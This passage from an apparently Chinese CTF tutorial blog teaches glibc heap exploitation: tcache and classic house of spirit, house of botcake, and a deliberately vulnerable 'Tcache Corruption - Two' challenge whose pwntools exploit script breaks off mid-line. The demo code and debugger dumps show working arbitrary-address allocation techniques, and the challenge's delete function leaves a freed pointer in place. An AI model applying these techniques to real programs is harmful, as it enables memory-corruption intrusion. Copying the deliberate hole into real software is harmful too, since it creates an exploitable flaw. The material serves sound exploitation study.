class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再去 malloc(0x30)，在可以看到申请来的结果在: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>观察fake_chunks[]数组变化</li>
<li>free(a)，<code>a = &amp;fake_chunks[2];</code>原因：tcache中存放的是chunk_mem_ptr，fake_chunks[0]是prev_size域，fake_chunk[1]是size域</li>
<li>在free(a)后的bins：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x7fffffffe390 ◂— 0x0</span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure>

<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>本例就是通过free一个fake chunk来让我们malloc任意地址</p>
<p>程序首先让堆初始化了，然后申请了变量a和fake_chunks</p>
<p>之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针</p>
<p>现在free a，我们的fake_chunk就被放到了free list中</p>
<p>此时再malloc就可以返回我们的fake chunk了</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的</p>
<p>我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc</p>
<p>让我们来看看和tcache有什么区别吧</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a, *b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">	<span class="comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// size</span></span><br><span class="line">	<span class="comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这是fake_chunks[?]可以数一下</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">    fake_chunks[<span class="number">2</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line">    fake_chunks[<span class="number">10</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">//现在下一次的malloc就将会返回我们的fake chunk了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">0x4242424242424242L</span>L;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ok!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的</p>
<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>对于没有tcache的glibc版本而言，我们需要连续伪造两块size合法的chunk，并且第二块chunk的size并不需要满足fastbin的要求，只要满足合法的size即可</p>
<p>本程序首先初始话了一下堆,然后申请了两个变量，一个是我们即将攻击的变量 a，另一个是我们的fake_chunks</p>
<p>程序先在fake_chunks[1]的地方也就是size域伪造了合法的size，0x40(满足fastbin size大小，与16字节对齐，标志位正确)</p>
<p>之后又在下一处伪造了第二个chunk，即从fake_chunks[8]开始的地方，这是为什么呢，因为我们第一个fake chunk的size伪造成了0x40，那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h3><p>本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house_of_botcake 是针对 glibc2.29 对 tcache double free 做出限制以后提出的利用方法&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们希望 malloc 到的地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc 7 个 chunk 以便稍后填满 tcache&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): prev=%p. 待会用\n&quot;</span>, prev); </span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再 malloc(0x100): a=%p. 作为攻击的 chunk\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;最后 malloc(0x10) 防止与 top chunk 合并\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来构造 chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第一步: 填满 tcache 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第二步: free 掉 chunk a，放入 unsorted bin 中&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第三步: 释放掉 chunk prev 因为后面是一个 free chunk，所以他会与 chunk a 合并&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第四步: 这时候已经没有指向 chunk a 的指针了，从 tcache 中取出一个，然后再次 free(a) 就把 chunk a 加入到了 tcache 中，造成了 double free \n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个 0x120 会从 unsorted bin 中分割出来，也就控制了前面已经合并的那个 chunk a 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;把 chunk a 的 next 指针给改为前面声明的 stack_var 的地址&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个就能申请到 stack_var 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 在：%p\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ul>
<li>从31行开始，这里free了7个chunk是为了填满tcache</li>
<li>再free(a)，使a放入unsortedbin中，再free(prev)，使再unsortedbin中的chunk a和chunk prev合并，实现chunk_overlapping，以至于此时bins中并没有chunk a的信息（chunk a的prev_size在0x555555603ad0）如下：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x5555556038c0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0                      </span><br></pre></td></tr></table></figure>

<ul>
<li>执行了38行的malloc(0x100)，使tcachebins中腾出了一个位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  6]: 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了39行过后，chunk a就被放入了tcachebins中，这就实现了<strong>double_free</strong>，一个在tcachebins中一个在unsortedbins</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins      <span class="comment">#|这个|#chunk a_mem_ptr</span></span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了42行后，修改了chunk a的next指针此时chunk a的情况：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/48gx 0x555555603ad0</span><br><span class="line">0x555555603ad0: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555603ae0: 0x00007fffffffe380      0x0000555555603010</span><br><span class="line">0x555555603af0: 0x0000000000000000      0x00000000000000f1</span><br><span class="line">0x555555603b00: 0x00007ffff7dcdca0      0x00007ffff7dcdca0</span><br><span class="line">0x555555603b10: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>同样bins也发生了变化，此时的bins:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x7fffffffe380 ◂— 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555603af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555603af0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure>

<p>最终，我们在连续申请两个chunk就能得到<code>&amp;stack_var</code>的哪个chunk。</p>
<blockquote>
<p>实战中，我们的stacke_var可以是任意地址</p>
</blockquote>
<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个double free</p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上</p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="tcache-corruption-dup-—-libc-2-27"><a href="#tcache-corruption-dup-—-libc-2-27" class="headerlink" title="tcache_corruption+dup — libc 2.27"></a>tcache_corruption+dup — libc 2.27</h3><p><a href="https://faraz.faith/2019-10-20-secconctf-2019-one/">one</a></p>
<h3 id="tcache-corruption-—-libc-2-29"><a href="#tcache-corruption-—-libc-2-29" class="headerlink" title="tcache_corruption — libc 2.29"></a>tcache_corruption — libc 2.29</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 22</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* nodes[LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inital</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	alarm(<span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tcache Corruption - Two&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_n</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read(STDIN_FILENO, buf, size);</span><br><span class="line">	<span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_int</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read_n(buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">	buf[result] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size, index = <span class="number">-1</span>, i, result;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!nodes[i]) &#123;</span><br><span class="line">			index = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (index == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of space!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">	size = get_int();</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">0x400</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nodes[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">	result = read_n(nodes[index], size);</span><br><span class="line">	<span class="keyword">if</span> (nodes[index][result - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">		nodes[index][result - <span class="number">1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">	index = get_int();</span><br><span class="line">	<span class="keyword">if</span> (index &gt;= LENGTH || !nodes[index]) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(nodes[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nodes[i]) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Index %d: %s\n&quot;</span>, i, nodes[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	inital();</span><br><span class="line">	welcome();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> choice = get_int();</span><br><span class="line">		<span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			add();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			delete();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			show();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o pwn1 pwn1.c  glibc-2.29 ubuntu18.04</span></span><br></pre></td></tr></table></figure>



<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Your choice: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="comment">##get </span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: 